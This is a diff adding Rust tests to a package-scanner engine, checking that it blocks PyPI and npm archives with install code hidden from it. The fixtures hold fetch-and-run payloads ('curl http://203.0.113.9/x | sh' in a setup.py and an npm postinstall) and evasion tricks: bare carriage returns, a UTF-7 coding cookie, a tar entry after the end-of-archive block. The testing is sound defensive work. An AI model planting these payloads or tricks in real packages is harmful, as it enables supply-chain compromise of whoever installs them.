@@ -2822,3 +2822,98 @@ async fn a_network_facing_server_without_a_token_refuses_policy_changes() {
     assert_eq!(r.status(), 200);
     h.stop().await;
 }
+
+// ---- Phase 3A: SCAN ----
+
+/// An offline engine with the real scanner and the dev models.
+fn real_scanner_engine(edit: impl FnOnce(&mut Policy)) -> (tempfile::TempDir, Arc<Engine>) {
+    let dir = tempfile::tempdir().unwrap();
+    let mut policy = Policy::default();
+    edit(&mut policy);
+    let engine = Engine::new(EngineConfig {
+        data_dir: dir.path().to_path_buf(),
+        models: dev_models(),
+        policy,
+        policy_path: dir.path().join("policy.toml"),
+        scanner: customs::engine::default_scanner(),
+        limits: Limits::default(),
+        metrics: Arc::new(Metrics::new()),
+    })
+    .unwrap();
+    (dir, engine)
+}
+
+const DEMO_PKG_INFO: &str = "Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\n";
+
+#[tokio::test(flavor = "multi_thread")]
+async fn install_code_hidden_from_the_feature_pass_is_blocked() {
+    // Inert text: the scanner only ever lexes it. CPython ends a line at a bare CR, so
+    // this setup.py runs `os.system(...)`; the feature lexers read one comment.
+    let archive = npm_tgz(&[
+        ("demo-1.0.0/PKG-INFO", DEMO_PKG_INFO),
+        (
+            "demo-1.0.0/setup.py",
+            "# setup\rimport os\ros.system('curl http://203.0.113.9/x | sh')\r",
+        ),
+    ]);
+    let (_dir, engine) = real_scanner_engine(|_| {});
+    let v = engine.scan_local(&archive, "demo-1.0.0.tar.gz", Ecosystem::Pypi, None);
+    assert_eq!(v.decision, customs_model::Decision::Block);
+    let hit = v.policy_hits.iter().find(|h| h.rule == "hidden_code");
+    let hit = hit.unwrap_or_else(|| panic!("{:?}", v.policy_hits));
+    assert_eq!(hit.severity, customs_model::Decision::Block);
+    assert!(
+        hit.detail.starts_with("setup.py:3: proc_exec"),
+        "{}",
+        hit.detail
+    );
+
+    let (_dir, engine) = real_scanner_engine(|p| p.hidden_code = RuleSeverity::Off);
+    let v = engine.scan_local(&archive, "demo-1.0.0.tar.gz", Ecosystem::Pypi, None);
+    assert!(!v.policy_hits.iter().any(|h| h.rule == "hidden_code"));
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn install_code_the_installer_reads_differently_is_blocked() {
+    let (_dir, engine) = real_scanner_engine(|_| {});
+    // A coding cookie that makes Python decode setup.py into different code.
+    let cookie = npm_tgz(&[
+        ("demo-1.0.0/PKG-INFO", DEMO_PKG_INFO),
+        (
+            "demo-1.0.0/setup.py",
+            "# -*- coding: utf-7 -*-\n# +AAo-import os; os.system('id')\n",
+        ),
+    ]);
+    let v = engine.scan_local(&cookie, "demo-1.0.0.tar.gz", Ecosystem::Pypi, None);
+    assert_eq!(v.decision, customs_model::Decision::Block);
+    let hit = v.policy_hits.iter().find(|h| h.rule == "unread_code");
+    let hit = hit.unwrap_or_else(|| panic!("{:?}", v.policy_hits));
+    assert!(
+        hit.detail.contains("declares coding utf-7"),
+        "{}",
+        hit.detail
+    );
+
+    // A tar entry after an end-of-archive block, which node-tar still extracts.
+    let entry = |data: &[u8]| {
+        let mut b = tar::Builder::new(Vec::new());
+        let mut h = tar::Header::new_gnu();
+        h.set_size(data.len() as u64);
+        h.set_mode(0o644);
+        b.append_data(&mut h, "package/package.json", data).unwrap();
+        b.into_inner().unwrap()
+    };
+    let mut tar = entry(br#"{"name":"demo","version":"1.0.0"}"#);
+    tar.truncate(tar.len() - 1024);
+    tar.extend([0u8; 512]);
+    tar.extend(entry(
+        br#"{"name":"demo","version":"1.0.0","scripts":{"postinstall":"curl http://203.0.113.9/x | sh"}}"#,
+    ));
+    let v = engine.scan_local(&tar, "demo-1.0.0.tgz", Ecosystem::Npm, Some("demo"));
+    assert_eq!(v.decision, customs_model::Decision::Block);
+    assert!(
+        v.policy_hits.iter().any(|h| h.rule == "scan_error"),
+        "{:?}",
+        v.policy_hits
+    );
+}
